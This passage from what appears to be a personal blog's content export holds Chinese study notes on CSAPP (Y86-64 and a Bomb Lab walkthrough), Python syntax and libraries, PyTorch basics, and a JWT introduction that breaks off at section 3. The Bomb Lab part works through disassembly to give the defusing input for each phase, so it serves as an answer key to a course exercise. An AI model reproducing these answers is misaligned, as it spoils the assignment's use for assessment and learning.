<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111101715379.png" alt="image-20211110171554335"></p>
<h3 id="数据传送-参数传递">数据传送(参数传递)</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111111049241.png" alt="image-20211111104856160"></p>
<p>X86-64处理器</p>
<p>AVX多媒体指令</p>
<h1>第4章 处理器体系结构</h1>
<h2 id="Y86-64指令集">Y86-64指令集</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111161152163.png" alt="image-20211116115227060"></p>
<h2 id="指令编码">指令编码</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111161152609.png" alt="image-20211116115239557"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111161153806.png" alt="image-20211116115337745"></p>
<h2 id="指令执行">指令执行</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111241611286.png" alt="image-20211124161139192"></p>
<h3 id="OPq、rrmovq、irmovq">OPq、rrmovq、irmovq</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111241617241.png" alt="image-20211124161712200"></p>
<h3 id="rmmovq、mrmovq">rmmovq、mrmovq</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111241627565.png" alt="image-20211124162704530"></p>
<h3 id="pushq、popq">pushq、popq</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111241634946.png" alt="image-20211124163446911"></p>
<h3 id="jmp、call、ret">jmp、call、ret</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111241706956.png" alt="image-20211124170645919"></p>
<h3 id="4-23">4-23</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111242023642.png" alt="image-20211124202339602"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111242029637.png" alt="image-20211124202937606"></p>
<h3 id="4-40">4-40</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111301630466.png" alt="image-20211130162835535"></p>
<h3 id="4-52">4-52</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112011636435.png" alt="image-20211201163636338"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/06/16/%E9%A1%B9%E7%9B%AE/CSAPP/CSAPP%20Bomb%20Lab/</url>
    <content><![CDATA[<h1>Bomb Lab</h1>
<p>查看bomb.c可以看到源代码的大致结构</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042020986.png" alt="image-20211204202050832"></p>
<p>反汇编main函数：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">disas main</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042024386.png" alt="image-20211204202454298"></p>
<p>根据汇编代码和原函数的对应关系，可以猜测方框处为对应的printf函数，打印出相应位置的字符串。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042027447.png" alt="image-20211204202746414"></p>
<h2 id="phase-1">phase_1</h2>
<p>phase_1首先调用read_line函数，调用函数时返回值保存至%rax寄存器中，之后调用phase_1(input)，在汇编调用中mov %rax, %rdi，%rdi寄存器用于函数调用时的参数传递，因此可以猜测%rdi中为输入的字符串的首地址。</p>
<p>反汇编phase_1，目标是要拆除bomb，则%eax的值应该为0，否则会调用explode_bomb。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042036445.png" alt="image-20211204203646413"></p>
<p>反汇编strings_not_equal和其中的string_length</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042049188.png" alt="image-20211204204919118"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042043079.png" alt="image-20211204204331046"></p>
<p>0对应于ASCII码的空字符，空字符是字符串的结束符，因此string_length为判断以%rdi为首地址的字符串的字符串的长度，并用%rax寄存器返回。</p>
<p>所以在strings_not_equal中，首先判断%rsi ，%rdi为首地址的字符串长度是否相同，长度相同的话逐字符比较是否相等，如果两个字符串相等，%rax=0，并返回。%rdi为输入的字符串，则%rsi为要判断是否相等的字符串，找出其地址，在汇编代码phase_1中，为0x402400，gdb查看内容。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042053647.png" alt="image-20211204205320626"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042054731.png" alt="image-20211204205419707"></p>
<h2 id="phase-2">phase_2</h2>
<p>查看phase_2的汇编代码</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042059377.png" alt="image-20211204205903327"></p>
<p>查看调用的read_six_numbers函数汇编代码</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042132486.png" alt="image-20211204213232445"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042133975.png" alt="image-20211204213314955"></p>
<p>可以发现函数读入6个int型数据，其中四个数据的存储位置通过寄存器传递，另外两个通过栈进行传递。</p>
<p>传递函数参数的寄存器</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042131451.png" alt="image-20211204213138427"></p>
<p>在read_six_numbers中（下图为16进制）：</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042132770.png" alt="image-20211204213209675"></p>
<p>分析phase_2的汇编代码，先判断(%rsp)处的值是否为1，然后与自己相加，即乘以2后与下一个数比较，依次向下，直到数据末尾。因此要输入的字符串为</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">4</span> <span class="number">8</span> <span class="number">16</span> <span class="number">32</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112042137075.png" alt="image-20211204213743046"></p>
<h2 id="phase-3">phase_3</h2>
<p>查看phase_3的汇编代码</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051122677.png" alt="image-20211205112242562"></p>
<p>在蓝色框中调用了scanf函数，并且返回值要大于1，否则炸弹会爆炸。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051125258.png" alt="image-20211205112527233"></p>
<p>可以看到scanf接受两个int值。</p>
<p>设置断点，随便输入两个数测试，发现0xc(%rsp)处为输入的第二个数，0x8(%rsp)处为输入的第一个数。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051134698.png" alt="image-20211205113446648"></p>
<p>则phase_3的汇编代码读入两个数后，将输入的第一个数与7比较，小于则跳转到*0x402470(, x, 8)处，x为输入的第一个数。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051142973.png" alt="image-20211205114250947"></p>
<p>输入的第一数为1时，跳转到0x400fb9，此处的指令将%eax寄存器的值设为0x137=311，并与第二个数比较。不同则调用explode_bomb。</p>
<p>因此输入为1 311，也可选择输入别的数。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051148670.png" alt="image-20211205114821636"></p>
<h2 id="phase-4">phase_4</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051300220.png" alt="image-20211205130044173"></p>
<p>与phase_3一样，这里也要输入两个数，同时还可以看出第一个数小于等于14，第二个数为0。通过寄存器给func4传递了三个参数%edi（输入的第一个数），%esi（0），%edx（0xe=14）</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051317090.png" alt="image-20211205131746044"></p>
<p>这里递归调用了func4函数，将汇编代码转换成等价的C代码，用a表示%edi的值，b表示%esi的值，c表示%edx的值</p>
<p>用标记t表示蓝色框最后%eax的值，则[（c-b）&gt;&gt;31+（c-b）] &gt;&gt; 1</p>
<p>下面用tmp表示执行完0x400fdf后%ecx的值：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun4</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = (((c - b) + ((c - b) &gt;&gt; <span class="number">31</span>)) &gt;&gt; <span class="number">1</span>) + b;</span><br><span class="line">    <span class="keyword">if</span> (tmp &lt;= a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp &gt;= a)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">return</span> (<span class="built_in">fun4</span>(a, tmp + <span class="number">1</span>, c) * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">fun4</span>(a, b, tmp - <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">fun4</span>(i, <span class="number">0</span>, <span class="number">14</span>) == <span class="number">0</span>)</span><br><span class="line">            cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到第一个数可能为：0，1，3，7</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051153046.png" alt="image-20211205115347016"></p>
<h2 id="phase-5">phase_5</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051540229.png" alt="image-20211205154040157"></p>
<p>先从上往下看，第一个红色框设置金丝雀值，然后判断输入的字符串长度是否为6。忽略其中部分代码，蓝色框是可以使函数正常退出的流程，其中比较了0x10(%rsp)处开始的字符串与0x40245e处开始的字符串是否相等。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051547240.png" alt="image-20211205154748217"></p>
<p>则函数栈中相应位置为：</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051602264.png" alt="image-20211205160209218"></p>
<p>分析绿色框中的汇编代码，因为%rbx的值为%rdi，即我们输入的字符串首地址，进行一系列操作，实际到红色框时，%rdx的低位字节的低4位对应于对应的字符值，其余全部置0。重要的是这条指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and    $0xf,%edx</span><br></pre></td></tr></table></figure>
<p>这时是以输入的字符数值大小作为索引，来到0x40108b查找相应的字符，放到位置0x10(%rsp, %rax, 1)处。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051611546.png" alt="image-20211205161111520"></p>
<p>这个实验的设置很有意思，哈哈，我们在这个数组中逐字符找到flyers的相应位置下标为：9 F E 5 6 7</p>
<p>这时只要到ASCII码中查找X9, XF, XE, X5, X6, X7相应的可输入字符即可，比如第一个字符可以为 ) (29)    9(39)    I(49)等。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051154265.png" alt="image-20211205115408234"></p>
<h2 id="phase-6">phase_6</h2>
<p>终于到了最后阶段。依旧对汇编代码进行分割，划分成几个阶段。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051821451.png" alt="image-20211205182158385"></p>
<p>与phase_2一样，读入6个int型数据，放到%rsi为首地址的地方，下面包含两个循环，外循环依次遍历6个数，内循环将这个数与之后的数比较。</p>
<p>外循环对原数据减1后$\leq$5，则原数据$\leq$6，同时这6个数据相互之间不想等。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051902625.png" alt="image-20211205190200537"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051937578.png" alt="image-20211205191611260"></p>
<p>这里首先对输入的六个数据进行7-x处理后在放到原位置。下面反复出现0x6032d0这个值。查看内存内容，可以发现其结构类似于结构体链表：</p>
<p>%rdx初始值为0x6032d0，则<code>mov 0x8(%rdx),%rdx</code>指令取下一个节点的地址。<code>	mov    (%rsp,%rsi,1),%ecx</code>取输入的数据值，如果不是1的话，则递增%eax，同时%rdx指向下一个节点的地址，指导%eax的值与当前的输入数据值相等。并将相应的节点位置放到</p>
<p><code>mov    %rdx,0x20(%rsp,%rsi,2)</code>，因此输入的数据对应了内存位置中的第几个节点。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051919795.png" alt="image-20211205191926752"></p>
<p>%rbx=0x20(%rsp)，这段代码保证了%rbx后面相应地址指针所指向的地址内容的低4位字节是递减顺序，这里就很坑，因为高四位字节就是1，2，3，4，5，6，看起来很顺眼。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112052007599.png" alt="image-20211205200728497"></p>
<p>得到上图，相应的数据为3 4 5 6 1 2，则原输入数据为：4 3 2 1 6 5</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112051154882.png" alt="image-20211205115430850"></p>
]]></content>
  </entry>
  <entry>
    <title>Python语法</title>
    <url>/2023/02/28/%E8%AF%AD%E6%B3%95/python/Python%20Reference/</url>
    <content><![CDATA[<p>sequence</p>
<h1>列表(lists)</h1>
<blockquote>
<p>[1,2,3]</p>
<p>odds=[3,5,7,9,11]</p>
<p>list(range(1,3))</p>
<p>​     	[1,2]</p>
<p>[odds[i] for i in range(1,3)]</p>
<p>​	[5,7]</p>
<p>sum([1,2,3])=6</p>
<p>sum([[1,2],[3]],[])=[1,2,3]</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202309112018499.png" alt="image-20230911201852400"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202309112019380.png" alt="image-20230911201922327"></p>
<ol>
<li class="lvl-3">
<p>函数参数加*号，代表将多个参数组装成列表</p>
</li>
<li class="lvl-3">
<p>数组前面加参数，代表把数组拆分成多个逗号分割的变量，类似js中的展开符号.</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x+y</span><br><span class="line">ls=[<span class="number">10</span>,<span class="number">12</span>]</span><br><span class="line">add(*ls)</span><br></pre></td></tr></table></figure>
<h2 id="range">range</h2>
<p>tuple</p>
<blockquote>
<p>immutable sequences</p>
</blockquote>
<p>Lecture18</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202309131030411.png" alt="image-20230913103055254"></p>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2023/06/16/%E8%AF%AD%E6%B3%95/python/python%E5%BA%93/</url>
    <content><![CDATA[<p>python库</p>
<h1>tqdm</h1>
<p><a href="https://tqdm.github.io/docs/tqdm/"><strong>init</strong></a></p>
<h1>logging</h1>
<p>软件运行过程中跟踪一些事件发生</p>
<p><a href="https://www.cnblogs.com/yoyoblogs/p/10948052.html">python学习笔记二:(python3 logging函数中format说明) - 陌生初见 - 博客园 (cnblogs.com)</a></p>
<h1>argparser</h1>
<p><a href="https://blog.csdn.net/yy_diego/article/details/82851661">argparse基本用法</a></p>
<h1>PIL</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示图片，图片尺寸，通道数</span></span><br><span class="line">img=Image.<span class="built_in">open</span>(<span class="string">&quot;Image/1.jpg&quot;</span>)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">img.size,img.layers</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#图片变为numpy对象，W*H*C,范围[0-256]</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">img_ndarray=np.asarray(img)</span><br><span class="line"><span class="comment">#W*H*C</span></span><br><span class="line">img_ndarray.shape</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#numpy转化为torch，C*W*H</span></span><br><span class="line">trans=torchvision.transforms.ToTensor()</span><br><span class="line">img2_trans=trans(img2_n)</span><br><span class="line">img2_trans.shape</span><br></pre></td></tr></table></figure>
<h1>python程序打包成exe</h1>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> pyinstaller</span><br><span class="line">pyinstaller xxx.py</span><br></pre></td></tr></table></figure>
<p><strong>常用可选项及说明：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>**-F：**打包后只生成单个exe格式文件；</p>
</li>
<li class="lvl-2">
<p>**-D：**默认选项，创建一个目录，包含exe文件以及大量依赖文件；</p>
</li>
<li class="lvl-2">
<p>**-c：**默认选项，使用控制台(就是类似cmd的黑框)；</p>
</li>
<li class="lvl-2">
<p>**-w：**不使用控制台；</p>
</li>
<li class="lvl-2">
<p>**-p：**添加搜索路径，让其找到对应的库；</p>
</li>
<li class="lvl-2">
<p>**-i：**改变生成程序的icon图标。</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/06/16/%E8%AF%AD%E6%B3%95/python/pytorch/</url>
    <content><![CDATA[<h1>pytorch</h1>
<h1>torch Tensor</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">x=torch.arange(<span class="number">12</span>)</span><br><span class="line">x</span><br><span class="line">tensor([ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#张量的形状</span></span><br><span class="line">x.shape</span><br><span class="line"></span><br><span class="line"><span class="comment">#含有元素个数</span></span><br><span class="line">x.numel()</span><br><span class="line"></span><br><span class="line"><span class="comment">#维度自动推断</span></span><br><span class="line">X=x.reshape(<span class="number">3</span>,<span class="number">4</span>)=x.reshape(-<span class="number">1</span>,<span class="number">4</span>)=x.reshape(<span class="number">3</span>,-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">torch.zeros((<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">torch.ones(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">torch.randn(<span class="number">3</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<h2 id="转置函数">转置函数</h2>
<p>在<code>pytorch</code>中转置用的函数就只有这两个</p>
<ol>
<li class="lvl-3">
<p><code>transpose()</code></p>
</li>
<li class="lvl-3">
<p><code>permute()</code></p>
</li>
</ol>
<h5 id="transpose"><code>transpose()</code></h5>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">torch.<span class="built_in">transpose</span>(input, dim0, dim1, <span class="keyword">out</span>=<span class="keyword">None</span>) → Tensor</span><br></pre></td></tr></table></figure>
<p>函数返回输入矩阵<code>input</code>的转置。交换维度<code>dim0</code>和<code>dim1</code></p>
<p>参数:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>input (Tensor) – 输入张量，必填</p>
</li>
<li class="lvl-2">
<p>dim0 (int) – 转置的第一维，默认0，可选</p>
</li>
<li class="lvl-2">
<p>dim1 (int) – 转置的第二维，默认1，可选</p>
</li>
</ul>
<p>注意<strong>只能有两个相关的交换</strong>的位置参数。</p>
<h5 id="permute"><code>permute()</code></h5>
<figure class="highlight stan"><table><tr><td class="code"><pre><span class="line">参数：</span><br><span class="line"></span><br><span class="line"><span class="built_in">dims</span> (<span class="type">int</span>…*)-换位顺序，必填</span><br></pre></td></tr></table></figure>
<h2 id="常用函数">常用函数</h2>
<p>one_hot</p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202204141022460.png" alt="image-20220414102235414"></p>
<h1>图像转换</h1>
<p>当用PIL中的<strong>Image.open</strong>打开RGB图像时，image.size = (w,h)<br>
即（列，行）—&gt;(x,y)<br>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/202204251123966.png" alt="在这里插入图片描述"><br>
如果把该图载转换为易于操作的ndarray形式，则：<br>
<strong>image = np.asarray(image)</strong></p>
<p>转换后的image.shape=（h,w,c）c为通道数，RGB图像c=3<br>
(h,w)为（行，列），即为（y,x）</p>
<h2 id="numpy">numpy</h2>
<p>numpy库数组属性查看：类型、尺寸、形状、维度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </span><br><span class="line">      </span><br><span class="line">a1 = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],dtype=np.complex128)  </span><br><span class="line"><span class="built_in">print</span>(a1)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数据类型&quot;</span>,<span class="built_in">type</span>(a1))           <span class="comment">#打印数组数据类型  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数组元素数据类型：&quot;</span>,a1.dtype) <span class="comment">#打印数组元素数据类型  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数组元素总数：&quot;</span>,a1.size)      <span class="comment">#打印数组尺寸，即数组元素总数  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数组形状：&quot;</span>,a1.shape)         <span class="comment">#打印数组形状  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数组的维度数目&quot;</span>,a1.ndim)      <span class="comment">#打印数组的维度数目  </span></span><br></pre></td></tr></table></figure>
<h2 id="PIL">PIL</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示图片，图片尺寸，通道数</span></span><br><span class="line">img=Image.<span class="built_in">open</span>(<span class="string">&quot;Image/1.jpg&quot;</span>)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">img.size,img.layers</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#图片变为numpy对象，W*H*C,范围[0-256]</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">img_ndarray=np.asarray(img)</span><br><span class="line"><span class="comment">#W*H*C</span></span><br><span class="line">img_ndarray.shape</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#numpy转化为torch，C*W*H</span></span><br><span class="line">trans=torchvision.transforms.ToTensor()</span><br><span class="line">img2_trans=trans(img2_n)</span><br><span class="line">img2_trans.shape</span><br></pre></td></tr></table></figure>
<p>tensor变为整数类型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [[<span class="number">1.</span>,<span class="number">2.</span>],[<span class="number">3.</span>,<span class="number">4.</span>]]</span><br><span class="line">b = torch.tensor(a)</span><br><span class="line"><span class="comment"># c = torch.tensor(b,dtype=torch.int)</span></span><br><span class="line">c = b.clone().<span class="built_in">type</span>(torch.<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202204131512427.png" alt="image-20220413151208381"></p>
<p>argmax：求某一维度最大值的下标</p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202203242018613.png" alt="image-20220324201852580"></p>
<p>detach</p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202204131100853.png" alt="image-20220413110006761"></p>
<h1>torch.nn</h1>
<h2 id="Flatten">Flatten</h2>
<blockquote>
<p>展平层，将1维到最后1维展开成一个向量形式</p>
</blockquote>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202203241748891.png" alt="image-20220324174809807"></p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202203241748637.png" alt="image-20220324174836609"></p>
<h2 id="torch-utils-data"><a href="https://pytorch.org/docs/1.10/data.html#torch.utils.data.DataLoader">torch.utils.data</a></h2>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202203232138139.png" alt="image-20220323213832027"></p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202203232152007.png" alt="image-20220323215218953"></p>
<p>torch.zeros</p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202203232230328.png" alt="image-20220323223004246"></p>
<h2 id="矩阵转置">矩阵转置</h2>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202203241051878.png" alt="image-20220324105139852"></p>
<h2 id="损失函数">损失函数</h2>
<p>nn.CrossEntropyloss</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/202204042153058.png" alt="image-20220404215314933"></p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202204042153107.png" alt="image-20220404215358048"></p>
<h1>optim</h1>
<h2 id="SGD">SGD</h2>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202203241703844.png" alt="image-20220324170304790"></p>
<h1>torchvision</h1>
<h2 id="transforms">transforms</h2>
<h3 id="ToTensor">ToTensor</h3>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202204071214356.png" alt="image-20220407121440273"></p>
]]></content>
  </entry>
  <entry>
    <title>Python语法</title>
    <url>/2023/09/11/%E8%AF%AD%E6%B3%95/python/python%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<p>sequence</p>
<h1>列表(lists)</h1>
<blockquote>
<p>[1,2,3]</p>
<p>odds=[3,5,7,9,11]</p>
<p>list(range(1,3))</p>
<p>​     	[1,2]</p>
<p>[odds[i] for i in range(1,3)]</p>
<p>​	[5,7]</p>
<p>sum([1,2,3])=6</p>
<p>sum([[1,2],[3]],[])=[1,2,3]</p>
</blockquote>
<ol>
<li class="lvl-3">
<p>函数参数加*号，代表将多个参数组装成列表</p>
</li>
<li class="lvl-3">
<p>数组前面加参数，代表把数组拆分成多个逗号分割的变量，类似js中的展开符号.</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x+y</span><br><span class="line">ls=[<span class="number">10</span>,<span class="number">12</span>]</span><br><span class="line">add(*ls)</span><br></pre></td></tr></table></figure>
<h2 id="range">range</h2>
<p>tuple</p>
<blockquote>
<p>immutable sequences</p>
</blockquote>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2024/10/10/%E6%A1%86%E6%9E%B6/JWT%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/</url>
    <content><![CDATA[<h1>1 什么是JWT</h1>
<p>JWT （JSON Web Token） 是目前最流行的跨域认证解决方案，是一种基于 Token 的认证授权机制。 从 JWT 的全称可以看出，JWT 本身也是 Token，一种规范化之后的 JSON 结构的 Token。</p>
<p><mark>JWT 自身包含了身份验证所需要的所有信息</mark>，因此，我们的服务器不需要存储 Session 信息。这显然增加了系统的可用性和伸缩性，大大减轻了服务端的压力。</p>
<p>可以看出，<strong>JWT 更符合设计 RESTful API 时的「Stateless（无状态）」原则</strong> 。</p>
<p>并且， 使用 JWT 认证可以有效避免 CSRF 攻击，因为 JWT 一般是存在在 localStorage 中，使用 JWT 进行身份验证的过程中是不会涉及到 Cookie 的。</p>
<h1>2 JWT由哪些部分组成</h1>
<p>JWT 本质上就是一组字串，通过（<code>.</code>）切分成三个为 Base64 编码的部分：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Header（头部）</strong> : 描述 JWT 的元数据，定义了生成签名的算法以及 <code>Token</code> 的类型。Header 被 Base64Url 编码后成为 JWT 的第一部分。</p>
</li>
<li class="lvl-2">
<p><strong>Payload（载荷）</strong> : 用来存放实际需要传递的数据，包含声明（Claims），如<code>sub</code>（subject，主题）、<code>jti</code>（JWT ID）。Payload 被 Base64Url 编码后成为 JWT 的第二部分。</p>
</li>
<li class="lvl-2">
<p><strong>Signature（签名）</strong>：服务器通过 Payload、Header 和一个密钥(Secret)使用 Header 里面指定的签名算法（默认是 HMAC SHA256）生成。生成的签名会成为 JWT 的第三部分。</p>
</li>
</ul>
<p>JWT 通常是这样的：<code>xxxxx.yyyyy.zzzzz</code>。</p>
<h1>3 如何基于JWT进行身份认证</h1>
